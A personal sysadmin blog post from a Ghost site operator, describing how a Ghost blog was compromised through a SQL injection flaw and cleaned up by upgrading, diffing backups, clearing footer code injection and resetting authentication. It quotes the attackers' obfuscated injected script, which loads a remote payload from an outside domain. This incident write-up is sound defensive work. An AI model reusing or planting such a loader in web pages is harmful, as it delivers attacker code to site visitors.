+++
date = '2026-05-23T19:26:50+05:30'
title = 'Cleaning up after Ghost Mass Compromise on SMC blog'
type = 'post'
tags = ['sysadmin']
+++

##### SMC's blog on ghost was compromised as part of a mass compromise of ghost blogs. This is how I cleaned it up. #####

In February, using Claude, someone [discovered an SQL injection vulnerability in Ghost](https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97). It had a score of 9.4/10.

Basically, attackers could read anything in the database.

Some time after that, a mass compromise was done with this vulnerability. Read [Ghost CMS Mass Compromised via CVE-2026-26980, Now Fueling ClickFix Attacks](https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/).

I didn't know any of this. Yesterday, I went to my FreshRSS feed reader, and read [Adhavan's Weekly Note](https://adhavansivaraj.xyz/posts/2026/05/19/weekly-notes-19-20/), which had this paragraph along with many others:

> Aruvu has been facing a series of hacks through our websites, which later resulted in a peer’s compromised laptop. How do people keep in touch with security advisories on every single service you maintain?

I wrote an email to Adhavan talking about something else from the blog, and added a PS about a post-mortem on this security incident.

In the reply Adhavan wrote today, A included the details and linked to the ghost vulnerability advisory above.

[SMC's blog](https://blog.smc.org.in/) is the only site using ghost that I'm responsible for. I logged in and checked the version:

>  6.10.1 

Uh oh. Anything less than 6.19.1 was affected with the vulnerability. But surely this blog wouldn't have been compromised yet?

I loaded a post and in the network console saw a (failed) request to "https://staticcloudflare.pro/". Uh ohhhhhhhhhh.

The actual injected script looked like this:

```html
<script>(function(){var _86250a=9482;var _bd6738="sj.ssc/ipa/orp.eralfduolccitats//:sptth";var _f07201=_bd6738.split("").reverse().join("");var _aff5ba=5183;var _e834fd=document.createElement("script");_e834fd.src=_f07201;_e834fd.defer=!0;document.head.appendChild(_e834fd)})();</script>
```

On searching for the domain staticcloudflare.pro, I came across [the write up by Qianxin Corporation's X Laboratory](https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/).

Then I did a series of things:

* Upgraded ghost to latest (6.41.0).
* Fixed email sending on the blog (had to sign up for mailtrap for that).
* Logged-in with the two factor auth that ghost automatically added.
* Obtained my staff token, made a backup with ghost-cli and tried to compare it with an older backup.
* Struggled with diff tools like [graphtage](https://github.com/trailofbits/graphtage) and finally used [jsondiffpatch](https://jsondiffpatch.com/) to find out the only thing that might have changed was codeinjection_foot
* Discovered that the last update of all the posts were around 2026-05-21T08:34:05.000Z (just three days ago!)

That last point doesn't mean that the breach happened only three days ago. As mentioned in XLab's write-up, the vulnerability was being continuously exploited in competition and therefore it could have started long ago.

### The fix

Since SMC blog probably didn't use post-level footer code injection (as I could not see any in the diff), I just set all the code back to null using mysql cli:

```sql
[mysql]> update posts set codeinjection_foot = NULL;
```

Finally, I went to ghost settings -> Advanced -> Danger Zone and did a "Reset All Authentication"
